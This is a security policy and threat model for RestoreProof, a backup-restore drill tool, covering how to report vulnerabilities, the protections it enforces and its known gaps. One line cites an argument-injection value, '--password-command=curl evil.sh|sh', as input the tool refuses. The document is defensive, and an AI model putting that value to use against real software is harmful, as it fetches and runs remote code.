# Security

RestoreProof restores production data and starts containers from it. Run
carelessly, a recovery drill *is* an incident: a copy of your customer database,
running on a laptop, reachable from the office network, left behind after the
drill ended.

The tool is built on that assumption. This document describes the threat model,
what is enforced, what is **not** covered, and how to report a vulnerability.

## Reporting a vulnerability

Please report privately, **not** as a public issue:

* GitHub → the repository's **Security** tab → *Report a vulnerability*
  (private advisory).

Include what you did, what happened, and what you expected. A scenario that
reproduces the problem is the most useful thing you can send.

This is a young, volunteer-maintained project. There is no paid support and no
guaranteed response time. Expect a first response within a few days and please
follow up if you do not get one. Credit is given in the advisory unless you ask
otherwise.

Please do **not** test against infrastructure you do not own.

## Threat model

### Who we defend against

1. **Mistakes.** The largest real risk. A production Compose file copied into a
   drill, a path typo pointing at `/etc`, a `DELETE` in a "check", a report with
   a password in it, an environment left running over the weekend.
2. **A configuration you did not write.** A `restoreproof.yaml` from a template
   repository, a vendor, or a pull request. It must not be able to read
   arbitrary files, reach arbitrary hosts, escape the container, or hijack the
   tools the drill runs.
3. **A hostile backup.** The archive being restored is *untrusted data*. It must
   not be able to place a symlink pointing at the host filesystem, or execute
   anything during restore.

### Who we do not defend against

* **A hostile operator.** Whoever runs `restoreproof` can already run anything
  the tool can run. `command` and `script` checks execute local code by design.
* **A hostile container image.** The Compose audit is static. It reads the
  Compose file; it does not constrain what an image does once running. A
  malicious image in your own Compose file is outside the model — RestoreProof
  is not a container sandbox.
* **Kernel or Docker vulnerabilities.** Container isolation is the container
  runtime's job.
* **A determined forger of reports.** Report digests detect accidental
  modification, not forgery (see below).

## What is enforced

### No shell, anywhere

Every external program — `docker`, `restic`, `borg`, your check scripts — is
executed from an `argv` array through one audited code path
(`restoreproof_core::process`). There is no code path that builds a command
line string, so shell metacharacters in a configuration value are inert. There
is a test asserting exactly that.

### No argument injection

Values that reach an external tool as arguments are validated first. A snapshot
id of `--password-command=curl evil.sh|sh` is refused at *configuration* time,
because an `argv` array does not stop a value from being read as an option.

### No inherited environment

Child processes start from an **empty** environment. Only `PATH`, `HOME`,
`LANG`, `TZ`, the injected `RESTOREPROOF_*` variables and whatever the check
explicitly declares are added. A credential sitting in the operator's shell
never reaches a check.

A configuration file may not set `PATH`, `LD_PRELOAD`, `LD_LIBRARY_PATH`,
`DOCKER_HOST` or the other variables that decide *which* program runs or *which*
daemon is contacted. Those are taken from the operator's own environment, and
only from there.

### Path confinement

Every path in a configuration file is resolved against the directory containing
that file, canonicalised — which resolves `..` **and symbolic links** — and then
required to stay inside the project.

* Data paths (backup repositories, password files, report directories) may be
  allowlisted outside the project with `security.allow_external_paths`.
* **Executable content cannot be allowlisted.** Scripts, the Compose file and
  the checks file must live inside the project, so that whatever runs during a
  drill is versioned alongside it.

### Read-only SQL, three ways

1. The statement is scanned at configuration time: one statement only, starting
   with `SELECT` or `WITH`; comment smuggling, dollar-quoting, stacked
   statements and a deny-list of writing, session-changing and file-reading
   keywords are refused.
2. It executes inside `BEGIN READ ONLY` with a server-side `statement_timeout`,
   and the transaction is always rolled back.
3. **You should still use a role with no write privileges.** Layers 1 and 2 are
   defence in depth, not a substitute for least privilege.

### No request forgery

HTTP checks may only target loopback unless `allow_external_http_targets` is
enabled; the same applies to SQL DSNs via `allow_external_sql_targets`. Proxy
environment variables are ignored, credentials in URLs are refused, redirects
are not followed by default and every hop is re-validated when they are.

### Compose auditing

Before anything starts, the Compose file is refused if it contains:

* `privileged: true`
* a mount of the Docker socket
* `network_mode: host`, `pid: host`, `ipc: host`, `userns_mode: host`
* dangerous capabilities (`SYS_ADMIN`, `SYS_PTRACE`, `SYS_MODULE`, `ALL`, …)
* `security_opt` disabling seccomp, AppArmor or SELinux
* device mappings
* bind mounts of host system directories, or of anything outside the project
* interpolated variables other than the ones RestoreProof injects, as mount
  sources
* ports published on `0.0.0.0` (loopback bindings are fine, and are what checks
  use)
* `external: true` networks, when `network_isolated` is on

This is a **static** audit. It is a guardrail against mistakes and copied
production files, not a sandbox.

### Secrets

* Secrets never appear in a configuration file. They come from a file
  (`password_file`) or an environment variable (`password_env`, `dsn_env`,
  `headers_from_env`).
* They are never passed on a command line, where they would be visible in the
  host's process list. Where the tool supports it — restic's
  `RESTIC_PASSWORD_FILE` — only the *path* is passed, so the plaintext never
  enters the `restoreproof` process.
* In memory they live in a type with no `Display`, a redacted `Debug`, and
  zeroing on drop.
* Every resolved secret is registered with a redactor that filters every log
  line, check message and report. URL credentials are additionally scrubbed
  structurally, which catches secrets nobody registered — for instance one
  printed by a failing external tool.
* A password file readable by other users produces a warning telling you to
  `chmod 600` it.

### Restored data is treated as untrusted

The `local` source copies only regular files and directories. Symbolic links,
sockets, FIFOs and device nodes are **skipped and reported**, because recreating
a symlink from an archive could point inside the recovery environment at the
host filesystem.

`file` checks re-confine their path after canonicalisation, so a restored
symlink cannot be used to read `/etc/shadow` into a report.

### Cleanup is guaranteed

The recovery environment is destroyed on every path: the normal one, an early
return, a panic, and a timeout — the last two through a `Drop` guard that tears
the Compose project down synchronously. The project name is unique per run, so a
leftover environment can always be found and removed by hand.

The workspace holding restored data is created with mode `0700` and removed with
the environment. Only `--keep-environment` disables this, and the CLI warns
loudly when it does.

### Memory safety and panics

`unsafe` code is **forbidden** across the workspace. `unwrap`, `expect`,
`panic`, unchecked indexing and integer division are denied by lint in library
code, so a malformed backup or a hostile YAML file produces an error, not a
crash.

## What is *not* protected

Please read this part.

* **Report digests are not signatures.** The SHA-256 in a report detects
  accidental modification and transcription errors. Anyone who can edit the
  report can also recompute the digest. Signed reports are out of scope here.
* **The Compose audit does not constrain running containers.**
* **`command` and `script` checks run arbitrary local code.** That is their
  purpose. Set `security.allow_command_checks: false` when the configuration
  comes from somewhere you do not fully trust.
* **RestoreProof does not encrypt anything.** Restored data sits unencrypted in
  a temporary directory for the duration of the drill.
* **No protection against a compromised backup *tool*.** If `restic` on your
  `PATH` is malicious, so is the drill.
* **Remote repositories mean network egress.** A `restic` repository at `s3:…`
  makes the drill talk to the network, under restic's own credentials. The plan
  output warns about it.

## Drilling with real production data

The most valuable drill uses the real backup. It is also the one that can cause
a breach. If you do it:

1. **Run on infrastructure you would trust with the production data itself.**
   The restored copy is exactly as sensitive as the original.
2. **Never publish ports on `0.0.0.0`.** RestoreProof refuses it by default;
   leave it that way.
3. **Keep cleanup on.** Use `--keep-environment` only when debugging, and remove
   the environment afterwards:
   ```bash
   docker compose -p <project> down -v
   rm -rf /tmp/restoreproof-<run id>
   ```
4. **Treat reports as sensitive.** They are written `0600` in a `0700`
   directory, but they contain table names, row counts and error messages from
   your production data. Think before attaching one to a public ticket.
5. **Consider a subset.** A drill on a representative subset proves most of what
   matters, with a fraction of the exposure.
6. **Mind your obligations.** Under the GDPR and similar regimes, a restored
   copy of personal data is still personal data: the same retention, access and
   record-keeping duties apply to it. Automatic masking is not part of this
   edition.

## Dependencies

Dependencies are kept few and deliberate. TLS is rustls, not OpenSSL. CI runs
`cargo audit` against the RustSec advisory database and `cargo deny` for
licences and duplicates on every push. See
[THIRD_PARTY_LICENSES.md](THIRD_PARTY_LICENSES.md).

## Supported versions

Only the latest release receives security fixes. Before 1.0, that means the
latest tag on `main`.
